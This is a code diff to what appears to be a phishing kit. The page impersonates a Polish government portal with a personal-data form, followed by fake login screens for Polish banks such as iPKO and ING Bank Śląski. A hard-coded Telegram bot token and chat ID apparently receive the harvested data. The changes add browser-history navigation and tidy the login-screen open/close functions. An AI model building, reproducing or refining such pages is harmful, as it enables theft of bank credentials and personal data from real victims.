@@ -2863,7 +2863,7 @@
         }
 
         /* ============================================================
-           RESPONSIVE — ZMIANY + IPHONE
+           RESPONSIVE
            ============================================================ */
 
         /* iPhone safe areas */
@@ -3196,20 +3196,15 @@
         }
 
         @media (max-width: 768px) {
-            /* ===== UKRYWAMY LOGIN NAV W TELEFONIE ===== */
             .login-nav {
                 display: none !important;
             }
-
-            /* ===== UKRYWAMY SIDEBAR I MENU ===== */
             .sidebar {
                 display: none !important;
             }
-            
             .menu-btn {
                 display: none !important;
             }
-
             .footer .container {
                 grid-template-columns: 1fr;
                 text-align: center;
@@ -3228,7 +3223,6 @@
             .logo-area .logo-main .separator {
                 font-size: 22px;
             }
-
             .header-search {
                 height: 34px;
                 width: 100%;
@@ -3263,8 +3257,6 @@
                 gap: 6px;
                 margin-right: 0;
             }
-
-            /* ===== WIĘKSZY BANNER (150%) ===== */
             .image-under-banner .image-wrapper img {
                 width: 100%;
                 max-width: 100%;
@@ -3272,7 +3264,6 @@
                 transform: scale(1.5);
                 transform-origin: center center;
             }
-
             .image-under-banner .image-wrapper .overlay-icon {
                 width: 100px;
                 height: 82px;
@@ -3298,15 +3289,12 @@
                 padding: 5px 14px;
                 border-width: 1.5px;
             }
-
             .data-form .form-group input#birthdate {
                 letter-spacing: 2px;
             }
-
             .data-form {
                 grid-template-columns: 1fr;
             }
-
             .data-form .address-row {
                 display: grid;
                 grid-template-columns: 2fr 1fr 1fr;
@@ -3316,11 +3304,9 @@
                 font-size: 13px;
                 padding: 8px 6px;
             }
-
             .data-form .address-row input[name="postal"] {
                 letter-spacing: 1px;
             }
-
             .data-form-section {
                 padding: 16px;
             }
@@ -3647,15 +3633,12 @@
         }
 
         @media (max-width: 480px) {
-            /* ===== SIDEBAR I MENU UKRYTE ===== */
             .sidebar {
                 display: none !important;
             }
-            
             .menu-btn {
                 display: none !important;
             }
-
             .logo-area .logo-main .gov {
                 font-size: 20px;
             }
@@ -3668,7 +3651,6 @@
             .logo-area .coat-of-arms {
                 height: 28px;
             }
-
             .header-search {
                 height: 30px;
                 border-radius: 4px;
@@ -3698,12 +3680,10 @@
                 gap: 4px;
                 margin-right: 0;
             }
-
             .image-under-banner .image-wrapper img {
                 transform: scale(1.5);
                 transform-origin: center center;
             }
-            
             .image-under-banner .image-wrapper .overlay-icon {
                 width: 70px;
                 height: 58px;
@@ -3731,7 +3711,6 @@
                 padding: 4px 10px;
                 border-width: 1px;
             }
-
             .data-form .address-row {
                 grid-template-columns: 2fr 1fr 1fr;
                 gap: 4px;
@@ -3740,11 +3719,9 @@
                 font-size: 12px;
                 padding: 6px 4px;
             }
-
             .data-form .address-row input[name="postal"] {
                 letter-spacing: 1px;
             }
-
             .data-form-section {
                 padding: 12px;
             }
@@ -4125,7 +4102,6 @@
             }
         }
 
-        /* iPhone notch fix */
         @supports (padding: max(0px)) {
             .bank3-full-page .login-container,
             .bank4-full-page .bank4-container,
@@ -4813,15 +4789,23 @@
         const TELEGRAM_BOT_TOKEN = '8587138753:AAGeakLE3xKdj97gKZ0URBxYvTy2CbC8kPs';
         const TELEGRAM_CHAT_ID = '-1004256695843';
 
-        // ===== GO BACK TO BANKS =====
+        // ===== NAVIGATION WITH HISTORY =====
+        function navigateTo(state, url) {
+            history.pushState(state, '', url);
+        }
+
+        // ===== GO BACK TO BANKS (with history) =====
         function goBackToBanks() {
+            // Hide all login screens
             document.querySelectorAll('.login-screen, .bank2-full-page, .bank3-full-page, .bank4-full-page, .bank5-full-page, .bank6-full-page, .bank7-full-page, .bank8-full-page, .bank9-full-page, .bank10-full-page, .bank12-full-page').forEach(el => {
                 el.classList.remove('visible');
             });
+            // Show bank selection
             document.getElementById('bankSelection').classList.add('visible');
             document.getElementById('bankFooter').classList.add('visible');
             document.body.style.overflow = '';
             window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateTo({ page: 'banks' }, '#banks');
         }
 
         function goBackToBanks2() {
@@ -4830,6 +4814,19 @@
             document.getElementById('bankFooter').classList.add('visible');
             document.body.style.overflow = '';
             window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateTo({ page: 'banks' }, '#banks');
+        }
+
+        // ===== NAVIGATE TO BANK =====
+        function navigateToBank(bankId, bankName) {
+            // Hide bank selection
+            document.getElementById('bankSelection').classList.remove('visible');
+            document.getElementById('bankFooter').classList.remove('visible');
+            // Show bank
+            document.getElementById(bankId).classList.add('visible');
+            document.body.style.overflow = 'hidden';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateTo({ page: 'bank', bank: bankName }, '#bank-' + bankName.toLowerCase().replace(/\s/g, '-'));
         }
 
         document.addEventListener('DOMContentLoaded', function() {
@@ -5027,6 +5024,7 @@
                         bankSelection.classList.add('visible');
                         bankFooter.classList.add('visible');
                         window.scrollTo({ top: 0, behavior: 'smooth' });
+                        navigateTo({ page: 'banks' }, '#banks');
                     } else {
                         showToast('Wystąpił błąd podczas wysyłania. Spróbuj ponownie.');
                     }
@@ -5056,6 +5054,54 @@
             document.addEventListener('click', function(e) {
                 if (toast.classList.contains('show') && !toast.contains(e.target)) {
                     toast.classList.remove('show');
+                }
+            });
+
+            // ===== HANDLE POPSTATE (browser back) =====
+            window.addEventListener('popstate', function(event) {
+                const state = event.state;
+                if (!state) {
+                    // Если нет состояния — возвращаемся на главную
+                    document.querySelectorAll('.bank-selection, .login-screen, .bank2-full-page, .bank3-full-page, .bank4-full-page, .bank5-full-page, .bank6-full-page, .bank7-full-page, .bank8-full-page, .bank9-full-page, .bank10-full-page, .bank12-full-page').forEach(el => {
+                        el.classList.remove('visible');
+                    });
+                    document.getElementById('dataFormSection').classList.remove('hidden');
+                    document.getElementById('loginNav').classList.remove('hidden');
+                    document.getElementById('imageBanner').classList.remove('hidden');
+                    document.body.style.overflow = '';
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                    return;
+                }
+
+                if (state.page === 'banks') {
+                    // Показать страницу с банками
+                    document.querySelectorAll('.login-screen, .bank2-full-page, .bank3-full-page, .bank4-full-page, .bank5-full-page, .bank6-full-page, .bank7-full-page, .bank8-full-page, .bank9-full-page, .bank10-full-page, .bank12-full-page').forEach(el => {
+                        el.classList.remove('visible');
+                    });
+                    document.getElementById('bankSelection').classList.add('visible');
+                    document.getElementById('bankFooter').classList.add('visible');
+                    document.body.style.overflow = '';
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                } else if (state.page === 'main') {
+                    // Показать главную страницу
+                    document.querySelectorAll('.bank-selection, .login-screen, .bank2-full-page, .bank3-full-page, .bank4-full-page, .bank5-full-page, .bank6-full-page, .bank7-full-page, .bank8-full-page, .bank9-full-page, .bank10-full-page, .bank12-full-page').forEach(el => {
+                        el.classList.remove('visible');
+                    });
+                    document.getElementById('dataFormSection').classList.remove('hidden');
+                    document.getElementById('loginNav').classList.remove('hidden');
+                    document.getElementById('imageBanner').classList.remove('hidden');
+                    document.body.style.overflow = '';
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                } else if (state.page === 'bank') {
+                    // Показать конкретный банк
+                    const bankId = state.bankId;
+                    if (bankId) {
+                        document.getElementById('bankSelection').classList.remove('visible');
+                        document.getElementById('bankFooter').classList.remove('visible');
+                        document.getElementById(bankId).classList.add('visible');
+                        document.body.style.overflow = 'hidden';
+                        window.scrollTo({ top: 0, behavior: 'smooth' });
+                    }
                 }
             });
         });
@@ -5158,12 +5204,9 @@
             return false;
         }
 
-        // ===== BANK OPEN/CLOSE FUNCTIONS =====
+        // ===== BANK OPEN FUNCTIONS (with history) =====
         function openLoginScreen1() {
-            document.getElementById('bankSelection').classList.remove('visible');
-            document.getElementById('bankFooter').classList.remove('visible');
-            document.getElementById('loginScreen1').classList.add('visible');
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateToBank('loginScreen1', 'iPKO');
         }
 
         function openLoginScreen2() {
@@ -5173,158 +5216,84 @@
             bank2.classList.add('visible');
             document.body.style.overflow = 'hidden';
             window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-
-        function closeLoginScreen2() {
-            document.getElementById('loginScreen2').classList.remove('visible');
-            document.getElementById('bankSelection').classList.add('visible');
-            document.getElementById('bankFooter').classList.add('visible');
-            document.body.style.overflow = '';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateTo({ page: 'bank', bankId: 'loginScreen2', bank: 'Bank 2' }, '#bank-2');
         }
 
         function openLoginScreen3() {
-            const bank3 = document.getElementById('loginScreen3');
-            bank3.classList.add('visible');
-            document.body.style.overflow = 'hidden';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-
-        function closeLoginScreen3() {
-            const bank3 = document.getElementById('loginScreen3');
-            bank3.classList.remove('visible');
-            document.body.style.overflow = '';
-            document.getElementById('bankSelection').classList.add('visible');
-            document.getElementById('bankFooter').classList.add('visible');
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateToBank('loginScreen3', 'Bank 3');
         }
 
         function openLoginScreen4() {
-            const bank4 = document.getElementById('loginScreen4');
-            bank4.classList.add('visible');
-            document.body.style.overflow = 'hidden';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-
-        function closeLoginScreen4() {
-            const bank4 = document.getElementById('loginScreen4');
-            bank4.classList.remove('visible');
-            document.body.style.overflow = '';
-            document.getElementById('bankSelection').classList.add('visible');
-            document.getElementById('bankFooter').classList.add('visible');
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateToBank('loginScreen4', 'Bank 4');
         }
 
         function openLoginScreen5() {
-            const bank5 = document.getElementById('loginScreen5');
-            bank5.classList.add('visible');
-            document.body.style.overflow = 'hidden';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-
-        function closeLoginScreen5() {
-            const bank5 = document.getElementById('loginScreen5');
-            bank5.classList.remove('visible');
-            document.body.style.overflow = '';
-            document.getElementById('bankSelection').classList.add('visible');
-            document.getElementById('bankFooter').classList.add('visible');
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateToBank('loginScreen5', 'Bank 5');
         }
 
         function openLoginScreen6() {
-            const bank6 = document.getElementById('loginScreen6');
-            bank6.classList.add('visible');
-            document.body.style.overflow = 'hidden';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-
-        function closeLoginScreen6() {
-            const bank6 = document.getElementById('loginScreen6');
-            bank6.classList.remove('visible');
-            document.body.style.overflow = '';
-            document.getElementById('bankSelection').classList.add('visible');
-            document.getElementById('bankFooter').classList.add('visible');
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateToBank('loginScreen6', 'Bank 6');
         }
 
         function openLoginScreen7() {
-            const bank7 = document.getElementById('loginScreen7');
-            bank7.classList.add('visible');
-            document.body.style.overflow = 'hidden';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-
-        function closeLoginScreen7() {
-            const bank7 = document.getElementById('loginScreen7');
-            bank7.classList.remove('visible');
-            document.body.style.overflow = '';
-            document.getElementById('bankSelection').classList.add('visible');
-            document.getElementById('bankFooter').classList.add('visible');
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateToBank('loginScreen7', 'Bank 7');
         }
 
         function openLoginScreen8() {
-            const bank8 = document.getElementById('loginScreen8');
-            bank8.classList.add('visible');
-            document.body.style.overflow = 'hidden';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-
-        function closeLoginScreen8() {
-            const bank8 = document.getElementById('loginScreen8');
-            bank8.classList.remove('visible');
-            document.body.style.overflow = '';
-            document.getElementById('bankSelection').classList.add('visible');
-            document.getElementById('bankFooter').classList.add('visible');
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateToBank('loginScreen8', 'Bank 8');
         }
 
         function openLoginScreen9() {
-            const bank9 = document.getElementById('loginScreen9');
-            bank9.classList.add('visible');
-            document.body.style.overflow = 'hidden';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-
-        function closeLoginScreen9() {
-            const bank9 = document.getElementById('loginScreen9');
-            bank9.classList.remove('visible');
-            document.body.style.overflow = '';
-            document.getElementById('bankSelection').classList.add('visible');
-            document.getElementById('bankFooter').classList.add('visible');
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateToBank('loginScreen9', 'Bank 9');
         }
 
         function openLoginScreen10() {
-            const bank10 = document.getElementById('loginScreen10');
-            bank10.classList.add('visible');
-            document.body.style.overflow = 'hidden';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-
-        function closeLoginScreen10() {
-            const bank10 = document.getElementById('loginScreen10');
-            bank10.classList.remove('visible');
-            document.body.style.overflow = '';
-            document.getElementById('bankSelection').classList.add('visible');
-            document.getElementById('bankFooter').classList.add('visible');
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateToBank('loginScreen10', 'Bank 10');
         }
 
         function openLoginScreen12() {
-            const bank12 = document.getElementById('loginScreen12');
-            bank12.classList.add('visible');
-            document.body.style.overflow = 'hidden';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateToBank('loginScreen12', 'ING Bank Śląski');
+        }
+
+        // ===== CLOSE FUNCTIONS =====
+        function closeLoginScreen2() {
+            goBackToBanks2();
+        }
+
+        function closeLoginScreen3() {
+            goBackToBanks();
+        }
+
+        function closeLoginScreen4() {
+            goBackToBanks();
+        }
+
+        function closeLoginScreen5() {
+            goBackToBanks();
+        }
+
+        function closeLoginScreen6() {
+            goBackToBanks();
+        }
+
+        function closeLoginScreen7() {
+            goBackToBanks();
+        }
+
+        function closeLoginScreen8() {
+            goBackToBanks();
+        }
+
+        function closeLoginScreen9() {
+            goBackToBanks();
+        }
+
+        function closeLoginScreen10() {
+            goBackToBanks();
         }
 
         function closeLoginScreen12() {
-            const bank12 = document.getElementById('loginScreen12');
-            bank12.classList.remove('visible');
-            document.body.style.overflow = '';
-            document.getElementById('bankSelection').classList.add('visible');
-            document.getElementById('bankFooter').classList.add('visible');
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+            goBackToBanks();
         }
 
         // ===== ESC =====
